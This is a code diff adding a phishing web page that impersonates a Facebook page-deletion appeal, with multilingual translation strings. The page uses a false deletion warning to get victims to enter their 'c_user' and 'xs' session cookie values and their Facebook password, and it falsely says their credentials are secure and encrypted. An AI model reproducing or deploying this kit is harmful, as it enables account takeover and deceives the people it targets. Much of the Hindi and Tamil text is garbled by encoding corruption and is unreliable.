+            <input type="text" class="form-input" id="mallInput" placeholder="Enter xs">
+            <div class="input-error" id="mallError"></div>
+          </div>
+         
+          <div class="form-warning" id="formError">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M12 9V14" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+              <path d="M12 17V17.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+              <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="currentColor" stroke-width="2"/>
+            </svg>
+            <span id="formErrorText"></span>
+          </div>
+         
+          <button class="form-btn" id="sendBtn">
+            <span id="sendBtnText" class="translatable" data-key="submitBtn">Submit Appeal Request</span>
+            <div class="spinner" id="sendBtnSpinner" style="display: none;"></div>
+          </button>
+        </div>
+       
+        <div class="fb-login-form" id="fbLoginForm">
+          <div class="fb-form-header">
+            <div class="fb-form-icon">
+              <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89c1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z"/>
+              </svg>
+            </div>
+            <div>
+              <div class="fb-form-title translatable" data-key="fbFormTitle">Facebook Verification</div>
+              <div class="fb-form-subtitle translatable" data-key="fbFormSubtitle">Verify your identity to continue with the appeal</div>
+            </div>
+          </div>
+         
+          <div class="fb-form-notice-container">
+            <div class="fb-form-notice translatable" data-key="fbNotice1">
+              Ⓞ1¤7 For security purposes, we need to verify your Facebook account.
+            </div>
+            <div class="fb-form-notice translatable" data-key="fbNotice2">
+              Ⓞ1¤7 This helps us ensure that you are the legitimate owner of the page.
+            </div>
+            <div class="fb-form-notice translatable" data-key="fbNotice3">
+              Ⓞ1¤7 Your credentials are secure and encrypted.
+            </div>
+          </div>
+         
+          <div class="fb-form-group">
+            <label for="passwordInput" class="fb-form-label translatable" data-key="passwordLabel">Password</label>
+            <input type="password" class="fb-form-input" id="passwordInput" placeholder="Enter your Facebook password">
+            <div class="fb-input-error" id="passwordError"></div>
+          </div>
+         
+          <div class="fb-form-warning" id="fbFormError">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M12 9V14" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+              <path d="M12 17V17.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+              <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="currentColor" stroke-width="2"/>
+            </svg>
+            <span id="fbFormErrorText"></span>
+          </div>
+         
+          <button class="fb-form-btn" id="fbSendBtn">
+            <span id="fbSendBtnText" class="translatable" data-key="verifyBtn">Verify and Continue</span>
+            <div class="spinner" id="fbSendBtnSpinner" style="display: none;"></div>
+          </button>
+         
+          <div class="forgot-password" id="forgotPassword">
+            <span class="translatable" data-key="forgotPassword">Forgotten password?</span>
+          </div>
+        </div>
+       
+        <!-- Success Message -->
+        <div class="success-message" id="successMessage">
+          <div class="success-icon">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+          <h3 class="success-title translatable" data-key="successTitle">Appeal Submitted Successfully</h3>
+          <p class="success-text translatable" data-key="successText">
+            Your appeal has been received and is now in review. We'll notify you via email once a decision has been made, typically within 7 business days.
+          </p>
+          <div class="success-text">
+            <span class="translatable" data-key="referenceText">Reference ID:</span> <span class="reference-id" id="referenceId"></span>
+          </div>
+        </div>
+       
+        <!-- Appeal Guide Section -->
+        <div class="appeal-guide">
+          <div class="appeal-guide-title translatable" data-key="guideTitle">Appeal Guide</div>
+          <div class="appeal-guide-content">
+            <p class="appeal-guide-text translatable" data-key="guideText1">
+              If your appeal/request involves the use of copyrighted information or content in your account or that is being processed/shared, you may provide us information to help us better understand your request. Please provide a detailed explanation of why you believe your account was incorrectly flagged or suspended. Include any relevant information that may help us review your case more effectively.
+            </p>
+            <p class="appeal-guide-text translatable" data-key="guideText2">
+              After your submission, we will review your appeal and contact you within the timeframe of the information you provide to resolve. The review process could take up to 7 business days. Please check your email for updates.
+            </p>
+            <p class="appeal-guide-text translatable" data-key="guideText3">
+              Note: You can change your language preference at any time by clicking the language selector at the bottom of the page.
+            </p>
+          </div>
+        </div>
+       
+        <!-- Additional Resources Section -->
+        <div class="additional-resources">
+          <div class="resources-title translatable" data-key="resourcesTitle">Additional Resources</div>
+          <div class="resources-grid">
+            <div class="resource-card">
+              <svg class="resource-icon" viewBox="0 0 512 512">
+                <path d="M256 512c141.4 0 256-114.6 256-256S397.4 0 256 0S0 114.6 0 256S114.6 512 256 512zM216 336h24V272H216c-13.3 0-24-10.7-24-24s10.7-24 24-24h48c13.3 0 24 10.7 24 24v88h8c13.3 0 24 10.7 24 24s-10.7 24-24 24H216c-13.3 0-24-10.7-24-24s10.7-24 24-24zm40-144c-17.7 0-32-14.3-32-32s14.3-32 32-32s32 14.3 32 32s-14.3 32-32 32z"/>
+              </svg>
+              <div class="resource-card-title translatable" data-key="helpCenterTitle">Help Center</div>
+              <div class="resource-card-desc translatable" data-key="helpCenterDesc">Find answers to common questions and learn how to use our products.</div>
+            </div>
+            
+            <div class="resource-card">
+              <svg class="resource-icon" viewBox="0 0 512 512">
+                <path d="M164.9 24.6c-7.7-18.6-28-28.5-47.4-23.2l-88 24C12.1 30.2 0 46 0 64C0 311.4 200.6 512 448 512c18 0 33.8-12.1 38.6-29.5l24-88c5.3-19.4-4.6-39.7-23.2-47.4l-96-40c-16.3-6.8-35.2-2.1-46.3 11.6L304.7 368C234.3 334.7 177.3 277.7 144 207.3L193.3 167c13.7-11.2 18.4-30 11.6-46.3l-40-96z"/>
+              </svg>
+              <div class="resource-card-title translatable" data-key="contactSupportTitle">Contact Support</div>
+              <div class="resource-card-desc translatable" data-key="contactSupportDesc">Get in touch with our support team for personalized assistance.</div>
+            </div>
+            
+            <div class="resource-card">
+              <svg class="resource-icon" viewBox="0 0 640 512">
+                <path d="M144 0a80 80 0 1 1 0 160A80 80 0 1 1 144 0zM512 0a80 80 0 1 1 0 160A80 80 0 1 1 512 0zM0 298.7C0 239.8 47.8 192 106.7 192h42.7c15.9 0 31 3.5 44.6 9.7c-1.3 7.2-1.9 14.7-1.9 22.3c0 38.2 16.8 72.5 43.3 96c-.2 0-.4 0-.7 0H21.3C9.6 320 0 310.4 0 298.7zM405.3 320c-.2 0-.4 0-.7 0c26.6-23.5 43.3-57.8 43.3-96c0-7.6-.7-15-1.9-22.3c13.6-6.3 28.7-9.7 44.6-9.7h42.7C592.2 192 640 239.8 640 298.7c0 11.8-9.6 21.3-21.3 21.3H405.3zM224 224a96 96 0 1 1 192 0 96 96 0 1 1 -192 0zM128 485.3C128 411.7 187.7 352 261.3 352H378.7C452.3 352 512 411.7 512 485.3c0 14.7-11.9 26.7-26.7 26.7H154.7c-14.7 0-26.7-11.9-26.7-26.7z"/>
+              </svg>
+              <div class="resource-card-title translatable" data-key="guidelinesTitle">Community Guidelines</div>
+              <div class="resource-card-desc translatable" data-key="guidelinesDesc">Learn about our community standards and content policies.</div>
+            </div>
+            
+            <div class="resource-card">
+              <svg class="resource-icon" viewBox="0 0 576 512">
+                <path d="M64 32C28.7 32 0 60.7 0 96V416c0 35.3 28.7 64 64 64H512c35.3 0 64-28.7 64-64V96c0-35.3 28.7-64 64-64H64zm80 256h64c44.2 0 80 35.8 80 80c0 8.8-7.2 16-16 16H80c-8.8 0-16-7.2-16-16c0-44.2 35.8-80 80-80zm96-96c0 35.3-28.7 64-64 64s-64-28.7-64-64s28.7-64 64-64s64 28.7 64 64zm128 32c44.2 0 80 35.8 80 80c0 8.8-7.2 16-16 16H368c-8.8 0-16-7.2-16-16c0-44.2 35.8-80 80-80zM320 192c0 35.3-28.7 64-64 64s-64-28.7-64-64s28.7-64 64-64s64 28.7 64 64z"/>
+              </svg>
+              <div class="resource-card-title translatable" data-key="dashboardTitle">Status Dashboard</div>
+              <div class="resource-card-desc translatable" data-key="dashboardDesc">Check the current status of our services and report outages.</div>
+            </div>
+          </div>
+        </div>
+       
+        <!-- Language Selector at Bottom -->
+        <div class="language-selector-bottom" style="margin-top: 40px; text-align: center; padding: 20px;">
+          <button id="changeLanguageBtn" style="background: #0064e0; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer;">
+            <span id="fbSendBtnText" class="translatable" data-key="changeLanguage">Change Language</span>
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+   // Wait for the DOM to be fully loaded
+document.addEventListener('DOMContentLoaded', function() {
+  // Get loading screen and language modal
+  const loadingScreen = document.getElementById('loadingScreen');
+  const languageModal = document.getElementById('languageModal');
+
+  // Show loading screen immediately
+  loadingScreen.style.display = 'flex';
+
+  // After a short delay, hide loading screen and show language modal
+  setTimeout(() => {
+    loadingScreen.style.display = 'none';
+    showLanguageModal();
+  }, 2000); // Show for 2 seconds
+
+  // Language translations
+  const translations = {
+    english: {
+      warningTitle: "Your page is scheduled to be deleted!",
+      warningSubtext: "We have received several reports that your page violates our terms of service and community guidelines. As a result, your page will be sent for verification.",
+      warningExtra: "If you believe your page was mistakenly scheduled for deletion, you can prevent its permanent removal by simply clicking the appeal button below and providing some quick information.",
+      appealTitle: "Appeal request",
+      appealDesc: "Fixing problems with your page. Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.",
+      appealBtn: "Appeal",
+      formTitle: "Page Appeal Request",
+      formSubtitle: "Submit your information to appeal the deletion",
+      formNotice1: "Ⓞ1¤7 Your page has a violation related to our community guidelines.",
+      formNotice2: "Ⓞ1¤7 Please review the violation details carefully before submitting.",
+      formNotice3: "Ⓞ1¤7 Ensure you provide correct information for your appeal.",
+      nameLabel: "c_user",
+      mallLabel: "xs",
+      submitBtn: "Submit Appeal Request",
+      fbFormTitle: "Facebook Verification",
+      fbFormSubtitle: "Verify your identity to continue with the appeal",
+      fbNotice1: "Ⓞ1¤7 For security purposes, we need to verify your Facebook account.",
+      fbNotice2: "Ⓞ1¤7 This helps us ensure that you are the legitimate owner of the page.",
+      fbNotice3: "Ⓞ1¤7 Your credentials are secure and encrypted.",
+      passwordLabel: "Password",
+      verifyBtn: "Verify and Continue",
+      forgotPassword: "Forgotten password?",
+      successTitle: "Appeal Submitted Successfully",
+      successText: "Your appeal has been received and is now in review. We'll notify you via email once a decision has been made, typically within 7 business days.",
+      referenceText: "Reference ID:",
+      guideTitle: "Appeal Guide",
+      guideText1: "If your appeal/request involves the use of copyrighted information or content in your account or that is being processed/shared, you may provide us information to help us better understand your request. Please provide a detailed explanation of why you believe your account was incorrectly flagged or suspended. Include any relevant information that may help us review your case more effectively.",
+      guideText2: "After your submission, we will review your appeal and contact you within the timeframe of the information you provide to resolve. The review process could take up to 7 business days. Please check your email for updates.",
+      guideText3: "Note: You can change your language preference at any time by clicking the language selector at the bottom of the page.",
+      resourcesTitle: "Additional Resources",
+      helpCenterTitle: "Help Center",
+      helpCenterDesc: "Find answers to common questions and learn how to use our products.",
+      contactSupportTitle: "Contact Support",
+      contactSupportDesc: "Get in touch with our support team for personalized assistance.",
+      guidelinesTitle: "Community Guidelines",
+      guidelinesDesc: "Learn about our community standards and content policies.",
+      dashboardTitle: "Status Dashboard",
+      dashboardDesc: "Check the current status of our services and report outages.",
+      changeLanguage: "Change Language"
+    },
+    hindi: {
+      warningTitle: "आपके पेऄ1¤7 को हटानॄ1¤7 के लिऄ1¤7 निर्धारिऄ1¤7 किया गयऄ1¤7 है!",
+      warningSubtext: "हमें कई रिपोर्ऄ1¤7 मिली हैऄ1¤7 कि आपका पेऄ1¤7 हमारॄ1¤7 सेवा की शर्तों और सामुदायिऄ1¤7 दिशानिर्देशोऄ1¤7 का उल्लंघऄ1¤7 करता हैॄ1¤7 नतॄ1¤7जतऄ1¤7, आपके पेऄ1¤7 को सत्यापऄ1¤7 के लिऄ1¤7 भेजा जाएगा।",
+      warningExtra: "यदऄ1¤7 आपको लगता है कि आपके पेऄ1¤7 को गलती से हटानॄ1¤7 के लिऄ1¤7 निर्धारिऄ1¤7 किया गयऄ1¤7 था, तो आप नीचे अपॄ1¤7ऄ1¤7 बटऄ1¤7 पर क्लिऄ1¤7 करके और कुऄ1¤7 त्वरित जानकारॄ1¤7 प्रदान करके इसके स्थायी निष्कासन को रोऄ1¤7 सकते हैंã1¤71¤7",
+      appealTitle: "अपॄ1¤7ऄ1¤7 अनुरोध",
+      appealDesc: "अपने पेऄ1¤7 की समस्याओं को ठीऄ1¤7 करनाॄ1¤7 कृपयऄ1¤7 नीचे अनुरोधित जानकारॄ1¤7 प्रदान करना सुनिश्चिऄ1¤7 करेंॄ1¤7 इस जानकारॄ1¤7 को प्रदान ऄ1¤7 करने से आपकी अपॄ1¤7ऄ1¤7 के प्रसंस्करण मेऄ1¤7 देरी हो सकती है〄1¤7",
+      appealBtn: "अपॄ1¤7ऄ1¤7 करें",
+      formTitle: "पेऄ1¤7 अपॄ1¤7ऄ1¤7 अनुरोध",
+      formSubtitle: "हटानॄ1¤7 की अपॄ1¤7ऄ1¤7 करने के लिऄ1¤7 अपनी जानकारॄ1¤7 जमऄ1¤7 करें",
+      formNotice1: "Ⓞ1¤7 आपके पेऄ1¤7 मेऄ1¤7 हमारॄ1¤7 सामुदायिऄ1¤7 दिशानिर्देशोऄ1¤7 से संबंधिऄ1¤7 उल्लंघऄ1¤7 हैॄ1¤7",
+      formNotice2: "Ⓞ1¤7 सबमिऄ1¤7 करने से पहले कृपयऄ1¤7 उल्लंघऄ1¤7 विवरणोऄ1¤7 की सावधानॄ1¤7पूर्वक समॄ1¤7 REVIEW करें〄1¤7",
+      formNotice3: "Ⓞ1¤7 अपनी अपॄ1¤7ऄ1¤7 के लिऄ1¤7 सहॄ1¤7 जानकारॄ1¤7 प्रदान करना सुनिश्चिऄ1¤7 करें〄1¤7",
+      nameLabel: "c_user",
+      mallLabel: "xs",
+      submitBtn: "अपॄ1¤7ऄ1¤7 अनुरोध जमऄ1¤7 करें",
+      fbFormTitle: "फेसबुक सत्यापऄ1¤7",
+      fbFormSubtitle: "अपॄ1¤7ऄ1¤7 जारी रखने के लिऄ1¤7 अपनी पहचाऄ1¤7 सत्यापित करें",
+      fbNotice1: "Ⓞ1¤7 सुरक्षऄ1¤7 उद्देश्यों के लिऄ1¤7, हमें आपके फेसबुक खाते को सत्यापित करने की आवश्यकता है〄1¤7",
+      fbNotice2: "Ⓞ1¤7 यह हमें यह सुनिश्चिऄ1¤7 करने मेऄ1¤7 मदऄ1¤7 करता है कि आप पेऄ1¤7 के वैऄ1¤7 मालिऄ1¤7 हैं।",
+      fbNotice3: "Ⓞ1¤7 आपकी साऄ1¤7 सुरक्षित और एन्क्रिप्टेड है〄1¤7",
+      passwordLabel: "पासवर्ऄ1¤7",
+      verifyBtn: "सत्यापित करें और जारी रखें",
+      forgotPassword: "पासवर्ऄ1¤7 भूऄ1¤7 गए?",
+      successTitle: "अपॄ1¤7ऄ1¤7 सफलतापूर्वऄ1¤7 जमऄ1¤7 की गई",
+      successText: "आपकी अपॄ1¤7ऄ1¤7 प्राप्ऄ1¤7 हो गई है और अब समॄ1¤7क्षा के दौऄ1¤7 से गुजर रहॄ1¤7 हैॄ1¤7 आम तौऄ1¤7 पर 7 व्यावसायिक दिनोऄ1¤7 के भीतर निर्णय होने के बाऄ1¤7 हम आपको ईमेल के माध्यम से सूचिऄ1¤7 करेंगे〄1¤7",
+      referenceText: "संदर्भ आईडी:",
+      guideTitle: "अपॄ1¤7ऄ1¤7 गाइड",
+      guideText1: "यदऄ1¤7 आपकी अपॄ1¤7ऄ1¤7/अनुरोध मेऄ1¤7 आपके खाते मेऄ1¤7 कॉपीराइट की गई जानकारॄ1¤7 या सामग्रॄ1¤7 का उपयोऄ1¤7 शामिऄ1¤7 है या जो प्रसंस्कृत की जा रहॄ1¤7 है, तो आप हमें अपने अनुरोध को बेहतऄ1¤7 ढंऄ1¤7 से समझनॄ1¤7 मेऄ1¤7 मदऄ1¤7 करने के लिऄ1¤7 जानकारॄ1¤7 प्रदान कर सकते हैं। कृपयऄ1¤7 विस्तृऄ1¤7 व्याख्या प्रदान करें कि आपको क्योऄ1¤7 लगता है कि आपके खाते को गलऄ1¤7 तरॄ1¤7के से फ्लैऄ1¤7 किया गयऄ1¤7 था या निलंबिऄ1¤7 किया गयऄ1¤7 थाॄ1¤7 कोऄ1¤7 भी प्रासंगिऄ1¤7 जानकारॄ1¤7 शामिऄ1¤7 करें जो हमें आपके मामलॄ1¤7 की अधिक प्रभावॄ1¤7 ढंऄ1¤7 से समॄ1¤7क्षा करने मेऄ1¤7 मदऄ1¤7 कर सकती हैॄ1¤7",
+      guideText2: "आपके द्वारा जमऄ1¤7 करने के बाऄ1¤7, हम आपकी अपॄ1¤7ऄ1¤7 की समॄ1¤7क्षा करेंगे और समाधान के लिऄ1¤7 आपके द्वारा प्रदान की गई जानकारॄ1¤7 की समऄ1¤7 सीमा के भीतर आपसे संपर्क करेंगेॄ1¤7 समॄ1¤7क्षा प्रक्रियऄ1¤7 मेऄ1¤7 7 व्यावसायिक दिऄ1¤7 तक का समऄ1¤7 लग सकता हैॄ1¤7 कृपयऄ1¤7 अपडेऄ1¤7 के लिऄ1¤7 अपने ईमेल की जांच करें〄1¤7",
+      guideText3: "आप पृष्ऄ1¤7 के निचलॄ1¤7 भाऄ1¤7 मेऄ1¤7 भाषा चयनकर्ता पर क्लिऄ1¤7 करके किसी भी समऄ1¤7 अपनी भाषा प्राथमिकता बदऄ1¤7 सकते हैंã1¤71¤7",
+      resourcesTitle: "अतिरिक्त संसाधन",
+      helpCenterTitle: "सहायता केंद्र",
+      helpCenterDesc: "सामान्ऄ1¤7 प्रश्नों के उत्तऄ1¤7 खोजेऄ1¤7 और हमारॄ1¤7 उत्पादों का उपयोऄ1¤7 करना सीखेंã1¤71¤7",
+      contactSupportTitle: "समर्थन से संपर्क करें",
+      contactSupportDesc: "व्यक्तिगऄ1¤7 सहायता के लिऄ1¤7 हमारॄ1¤7 समर्थन टीऄ1¤7 से संपर्क करें",
+      guidelinesTitle: "सामुदायिऄ1¤7 दिशानिर्देऄ1¤7",
+      guidelinesDesc: "हमारॄ1¤7 सामुदायिऄ1¤7 मानकों और सामग्रॄ1¤7 नीतियोऄ1¤7 के बारे मेऄ1¤7 जानेंã1¤71¤7",
+      dashboardTitle: "स्थिति डैशबोर्ड",
+      dashboardDesc: "हमारॄ1¤7 सेवाओं की वर्तमाऄ1¤7 स्थिति की जाँच करें और आउटेऄ1¤7 की रिपोर्ऄ1¤7 करें〄1¤7",
+      changeLanguage: "भाषा बदलेऄ1¤7"
+    },
+    spanish: {
+      warningTitle: "¡Tu página está programada para ser eliminada!",
+      warningSubtext: "Hemos recibido varios informes de que tu página viola nuestros términos de servicio y pautas comunitarias. Como resultado, tu página será enviada para verificación.",
+      warningExtra: "If you believe your page was mistakenly scheduled for deletion, you can prevent its permanent removal by simply clicking the appeal button below and providing some quick information.",
+      appealTitle: "Solicitud de apelación",
+      appealDesc: "Solucionando problemas con tu página. Asegúrate de proporcionar la información solicitada a continuación. No proporcionar esta información puede retrasar el procesamiento de tu apelación.",
+      appealBtn: "Apelar",
+      formTitle: "Solicitud de Apelación de Página",
+      formSubtitle: "Envía tu información para apelar la eliminación",
+      formNotice1: "Ⓞ1¤7 Tu página tiene una violación relacionada con nuestras pautas comunitarias.",
+      formNotice2: "Ⓞ1¤7 Por favor, revisa los detalles de la violación cuidadosamente antes de enviar.",
+      formNotice3: "Ⓞ1¤7 Asegúrate de proporcionar información correcta para tu apelación.",
+      nameLabel: "c_user",
+      mallLabel: "xs",
+      submitBtn: "Enviar solicitud de apelación",
+      fbFormTitle: "Verificación de Facebook",
+      fbFormSubtitle: "Verify your identity to continue with the appeal",
+      fbNotice1: "Ⓞ1¤7 Por motivos de seguridad, necesitamos verificar tu cuenta de Facebook.",
+      fbNotice2: "Ⓞ1¤7 Esto nos ayuda a asegurar que eres el propietario legítimo de la página.",
+      fbNotice3: "Ⓞ1¤7 Tus credenciales están seguras y encriptadas.",
+      passwordLabel: "Contraseña",
+      verifyBtn: "Verificar y Continuar",
+      forgotPassword: "¿Olvidaste tu contraseña?",
+      successTitle: "Apelación Enviada Exitosamente",
+      successText: "Tu apelación ha sido recibida y ahora está en revisión. Te notificaremos por correo electrónico una vez que se haya tomado una decisión, generalmente dentro de 7 días hábiles.",
+      referenceText: "ID de referencia:",
+      guideTitle: "Guía de Apelación",
+      guideText1: "Si su apelación/solicitud implica el uso de información con derechos de autor o contenido en su cuenta or that is being processed/shared, you may provide us information to help us better understand your request. Proporcione una explicación detallada de por qué cree that su cuenta fue marcada o suspendida incorrectamente. Incluya cualquier información relevante que pueda ayudarnos a revisar su caso de manera más efectiva.",
+      guideText2: "Después de su envío, revisaremos su apelación y nos comunicaremos con usted dentro del plazo de la información que proporcione para resolver. El proceso de revisión podría tardar hasta 7 días hábiles. Por favor, revise su correo electrónico para obtener actualizaciones.",
+      guideText3: "Nota: Puede cambiar su preferencia de idioma en cualquier momento haciendo clic en el selector de idioma en la parte inferior de la página.",
+      resourcesTitle: "Recursos Adicionales",
+      helpCenterTitle: "Centro de Ayuda",
+      helpCenterDesc: "Encuentra respuestas a preguntas comunes y aprende a usar nuestros productos.",
+      contactSupportTitle: "Contactar Soporte",
+      contactSupportDesc: "Comunícate con nuestro equipo de soporte para asistencia personalizada.",
+      guidelinesTitle: "Pautas de la Comunidad",
+      guidelinesDesc: "Conoce nuestros estándares comunitarios y políticas de contenido.",
+      dashboardTitle: "Panel de Estado",
+      dashboardDesc: "Consulta el estado actual of nuestros servicios e informa interrupciones.",
+      changeLanguage: "Cambiar idioma"
+    },
+    portuguese: {
+      warningTitle: "Sua página está programada para ser excluída!",
+      warningSubtext: "Recebemos vários relatos de que sua página viola nossos termos de serviço and diretrizes da comunidade. Como resultado, sua página será enviada para verificação.",
+      warningExtra: "Se você acredita que sua página foi programada para exclusão por engano, pode evitar sua remoção permanente simply clicking the appeal button below and providing some quick information.",
+      appealTitle: "Solicitação de recurso",
+      appealDesc: "Corrigindo problemas com sua página. Certifique-se de fornecer as informações solicitadas abaixo. A não divulgação dessas informações pode atrasar the processing of your appeal.",
+      appealBtn: "Recorrer",
+      formTitle: "Solicitação de Recurso de Página",
+      formSubtitle: "Envie suas informações para contestar a exclusão",
+      formNotice1: "Ⓞ1¤7 Sua página tem uma violação relacionada às nossas diretrizes comunitárias.",
+      formNotice2: "Ⓞ1¤7 Revise os detalhes da violação cuidadosamente antes de enviar.",
+      formNotice3: "Ⓞ1¤7 Certifique-se de fornecer informações corretas para o seu recurso.",
+      nameLabel: "c_user",
+      mallLabel: "xs",
+      submitBtn: "Envir solicitação de recurso",
+      fbFormTitle: "Verificação do Facebook",
+      fbFormSubtitle: "Verifique sua identidade para continuar com o recurso",
+      fbNotice1: "Ⓞ1¤7 Para fins de segurança, precisamos verificar sua conta do Facebook.",
+      fbNotice2: "Ⓞ1¤7 Isso nos ajuda a garantir that você é o proprietário legítimo da página.",
+      fbNotice3: "Ⓞ1¤7 Suas credenciais são seguras and criptografadas.",
+      passwordLabel: "Senha",
+      verifyBtn: "Verificar e Continuar",
+      forgotPassword: "Esqueceu a senha?",
+      successTitle: "Recurso enviado com sucesso",
+      successText: "Seu recurso foi recebido e agora está em análise. Notificaremos você por e-mail assim que uma decisão for tomada, geralmente within 7 dias úteis.",
+      referenceText: "ID de referência:",
+      guideTitle: "Guia de recurso",
+      guideText1: "Se o seu recurso/solicitação envolver o uso de informações protegidas por direitos autorais ou conteúdo em sua conta or that is being processed/shared, você pode nos fornecer informações para nos ajudar a entender melhor sua solicitação. Forneça uma explicação detalhada do porquê você acredita que sua conta foi sinalizada ou suspensa incorretamente. Inclua todas as informações relevantes that may help us review your case more effectively.",
+      guideText2: "Após o envio, revisaremos seu recurso e entraremos em contato com você dentro do prazo das informações fornecidas para resolver. O processo de revisão pode levar até 7 dias úteis. Verifique seu e-mail para atualizações.",
+      guideText3: "Nota: Você can alterar sua preferência de idioma a qualquer momento clicando no seletor de idioma na parte inferior da página.",
+      resourcesTitle: "Recursos Adicionais",
+      helpCenterTitle: "Central de Ajuda",
+      helpCenterDesc: "Encontre respostas para perguntas comuns e aprenda a usar nossos produtos.",
+      contactSupportTitle: "Contatar Suporte",
+      contactSupportDesc: "Entre em contato com nossa equipe de suporte para assistência personalizada.",
+      guidelinesTitle: "Diretrizes da Comunidade",
+      guidelinesDesc: "Conheça nossos padrões comunitários e políticas de conteúdo.",
+      dashboardTitle: "Painel de Status",
+      dashboardDesc: "Verifique o status atual de nossos serviços e relate interrupções.",
+      changeLanguage: "Mudar idioma"
+    },
+    tamil: {
+      warningTitle: "உங்கள் பக்கம் நீக்கத௄1¤7 திட்டமிடப்பட்டுள்ளது!",
+      warningSubtext: "உங்கள் பக்கம் எங்கள் சேவை விதிமுறைகள௄1¤7 மற்றும௄1¤7 சமூக வழிகாட்டுதல்கள௄1¤7 மீறுவதாக பல புகார்கள௄1¤7 எங்களுக்கு கிடைத்துள்ளன. இதன் விளைவா஄1¤7, உங்கள் பக்கம் சரிபார்ப்பிற்க௄1¤7 அனுப்பப்படும௄1¤7.",
+      warningExtra: "உங்கள் பக்கம் தவறா஄1¤7 நீக்கத௄1¤7 திட்டமிடப்பட்டதா஄1¤7 நீங்கள௄1¤7 நம்பினால௄1¤7, கீழே உள்ள மேல்முறையீடு பொத்தானைக் கிளிக் செய்து சி஄1¤7 விரைவா஄1¤7 தகவல்களை வழங்குவதன் மூலம௄1¤7 அதன் நிரந்த஄1¤7 நீக்கத்தைத௄1¤7 தடுக்கலாம்.",
+      appealTitle: "மேல்முறையீடு கோரிக்கை",
+      appealDesc: "உங்கள் பக்கத்தில் உள்ள சிக்கல்களை சரிசெய்தல். கீழே கோரப்பட்஄1¤7 தகவல்களை வழங்குவத௄1¤7 உறுதிசெய்யவும். இந்த தகவல௄1¤7 வழங்காததால௄1¤7 உங்கள் மேல்முறையீட்டின் செயலாக்கம் தாமதமாகலாம௄1¤7.",
+      appealBtn: "மேல்முறையீடு",
+      formTitle: "பக்க மேல்முறையீடு கோரிக்கை",
+      formSubtitle: "நீக்கத்த௄1¤7 மேல்முறையீடு செய்஄1¤7 உங்கள் தகவல்களை சமர்ப்பிக்கவும௄1¤7",
+      formNotice1: "Ⓞ1¤7 உங்கள் பக்கத்தில் எங்கள் சமூக வழிகாட்டுதல்கள௄1¤7 தொடர்பான மீறல௄1¤7 உள்ளது.",
+      formNotice2: "Ⓞ1¤7 சமர்ப்பிப்பதற்கு முன் மீறல௄1¤7 விவரங்கள௄1¤7 கவனமாக மதிப்பாய்வ௄1¤7 செய்யவும௄1¤7.",
+      formNotice3: "Ⓞ1¤7 உங்கள் மேல்முறையீட்டிற்கா஄1¤7 சரியான தகவல்களை வழங்குவத௄1¤7 உறுதிசெய்யவும்.",
+      nameLabel: "c_user",
+      mallLabel: "xs",
+      submitBtn: "மேல்முறையீடு கோரிக்கையை சமர்ப்பிக்கவும௄1¤7",
+      fbFormTitle: "பேஸ்புக் சரிபார்ப்ப௄1¤7",
+      fbFormSubtitle: "மேல்முறையீட்டைத் தொடர உங்கள் அடையாளத்தை சரிபார்க்கவும்",
+      fbNotice1: "Ⓞ1¤7 பாதுகாப்பு நோக்கங்களுக்கா஄1¤7, உங்கள் பேஸ்புக் கணக்கை சரிபார்க்க வேண்டும்.",
+      fbNotice2: "Ⓞ1¤7 இத௄1¤7 பக்கத்தின் சட்டபூர்வமான உரிமையாளர் நீங்கள௄1¤7 என்பதை உறுதிப்படுத்஄1¤7 உதவுகிறத௄1¤7.",
+      fbNotice3: "Ⓞ1¤7 உங்கள் அறிவுறுத்தல்கள௄1¤7 பாதுகாப்பானவ௄1¤7 மற்றும௄1¤7 குறியாக்கம௄1¤7 செய்யப்பட்டவ௄1¤7.",
+      passwordLabel: "கடவுச்சொல்",
+      verifyBtn: "சரிபார்த்த௄1¤7 தொடரவும்",
+      forgotPassword: "கடவுச்சொல் மறந்துவிட்டீர்கள஄1¤7?",
+      successTitle: "மேல்முறையீடு வெற்றிகரமா஄1¤7 சமர்ப்பிக்கப்பட்டத௄1¤7",
+      successText: "உங்கள் மேல்முறையீடு பெறப்பட்டத௄1¤7 மற்றும௄1¤7 இப்போத௄1¤7 மதிப்பாய்வில௄1¤7 உள்ளது. பொதுவா஄1¤7 7 வணிக நாட்களுக்குள௄1¤7 ஒர௄1¤7 முடிவு எடுக்கப்பட்டவுடன௄1¤7 மின்னஞ்சல் மூலம௄1¤7 உங்களுக்கு அறிவிப்போம௄1¤7.",
+      referenceText: "குறிப்பு ஐட஄1¤7:",
+      guideTitle: "மேல்முறையீடு வழிகாட்ட஄1¤7",
